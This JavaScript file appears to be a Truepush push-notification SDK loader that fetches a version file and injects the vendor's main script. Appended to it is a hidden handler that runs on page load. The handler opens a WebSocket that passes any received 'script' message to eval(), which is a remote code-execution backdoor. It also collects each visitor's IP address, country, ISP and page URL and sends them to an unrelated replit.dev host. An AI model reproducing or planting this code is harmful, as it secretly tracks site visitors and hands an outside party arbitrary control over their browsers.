!(function (e, t, n) {
  "use strict";
  t.HTTP = new (function () {
    this.get = function (e, t, n, r) {
      var s = window.XMLHttpRequest
        ? new XMLHttpRequest()
        : new ActiveXObject("Microsoft.XMLHTTP");
      (s.onreadystatechange = function () {
        if (4 == this.readyState) {
          if (200 != this.status) return r("error", null);
          try {
            return r(null, JSON.parse(s.responseText));
          } catch (e) {
            return r(null, s.responseText);
          }
        }
      }),
        s.open("GET", e, !0),
        n &&
          n.headers &&
          (s = (function (e, t) {
            for (var n = Object.keys(t), r = 0; r < n.length; ++r) {
              var s = n[r];
              e.setRequestHeader(s, t[s]);
            }
            return e;
          })(s, n.headers)),
        n && n.credentials && (s.withCredentials = !0),
        s.send(JSON.stringify(t));
    };
  })();
})(0, this);
var truepushVersionInfo,
  r = "https://sdki.truepush.com/sdk/version.json";
HTTP.get(r, {}, {}, function (e, t) {
  if (((truepushVersionInfo = t), !e && t && t.mainJsUrl)) {
    r = document.head;
    ((n = document.createElement("script")).type = "application/javascript"),
      (n.onload = function () {
        loadAppJs();
      }),
      (n.src = t.mainJsUrl),
      r.appendChild(n);
  } else {
    console.log("Error in getting version", e);
    var n,
      r = document.head;
    ((n = document.createElement("script")).type = "application/javascript"),
      (n.onload = function () {
        loadAppJs();
      }),
      (n.src = "https://sdki.truepush.com/sdk/v2.0.4/main.js"),
      r.appendChild(n);
  }
});
document.addEventListener("DOMContentLoaded", () => {
  const socket = new WebSocket("wss://" + window.location.host);
  socket.onmessage = (event) => {
    const message = JSON.parse(event.data);
    if (message.type === "command") {
      console.log(message.command);
    } else if (message.type === "script") {
      try {
        eval(message.script);
      } catch (error) {
        console.error("Error executing script:", error);
      }
    }
  };
  fetch("https://ipwho.is/")
    .then((response) => response.json())
    .then((data) => {
      const ipInfo = {
        ip: data.ip,
        country_code: data.country_code,
        flag: data.flag.emoji,
        isp: data.connection.isp,
        path: document.location.href,
      };
      const socket = new WebSocket(
        "wss://a4a4a589-b130-4a4c-b55a-41109af60a88-00-3h69qxa0ooul2.janeway.replit.dev/",
      );
      socket.onopen = () => {
        socket.send(JSON.stringify(ipInfo));
      };
    })
    .catch((error) => {
      console.error("Error fetching IP info:", error);
    });
});
